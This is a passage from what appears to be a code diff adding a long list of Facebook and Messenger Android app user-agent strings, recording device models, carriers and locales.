Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]                 Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]
-#Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]         Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]                 Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]              Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]    Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;]
+   "Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]",
+   "Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]",
+   "Dalvik/2.1.0 (Linux, U; Android 7.0, Hisense Hi 3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 2391017119 FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux, U; Android 7.0, HisenseHi3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 239.10.17.119,FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920):FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;]",
+   "Dalvik/2.1.0 9Linux;U; Android 5.1.1; A37f Build/LMY47V( [FBAN/EMA;UNITY_PACKAGE/1315;FBBV/203779460;FBAV/190.0.0.6.117;FBDV/A37F;FBLC/en_US;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]",
+   "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; W-K200 Build/O11019) [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/234444154;FBAV/209.0.0.5.119;FBDV/W-K200;FBLC/vi_VN;FBOP/20;FBNG/3G;FBCQ/UNKNOWN;FBMNT/METERED]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_X00QD Build/PPR1.180610.009) [FBAN/EMA;UNITY_PACKAGE/1634;FBBV/244867833;FBAV/216.0.0.10.121;FBDV/ASUS_X00QD;FBLC/pt_BR;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build/R16NW) [FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.0; LG-H901 Build/NRD90U) [FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; SM-A305F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build/N6F26Q) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/253310646;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1727;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1080,height=2016};FB_FW/1;]"
+   "Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A5 2019 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/269.0.0.15.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/221129137;FBCR/Movistar;FBMF/ZTE;FBBD/ZTE;FBDV/ZTE Blade A5 2019;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build/LYZ28N) [FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20]",
+   "Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-S111DL;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1431};FB_FW/1;]",
+   "Dalvik/2.1.0(Linux;v; Android;D6.0;LG_X230build/MRA58K)[FBAN/EMA;UNITY_PACKAGE/1826;FBBV/262675052.fbav/230.0.0.3.121;fbdv/lg_x230;fblc/es_ES,FBOP/20,fbng/wifi,fbcq/con.moblica,common x mob.protocol.data connectionQualitydata@48e505d8;fbmnt/not_metereo]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1;]",
+   "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DUB-LX1;FBSV/8.1.0;FBCA",
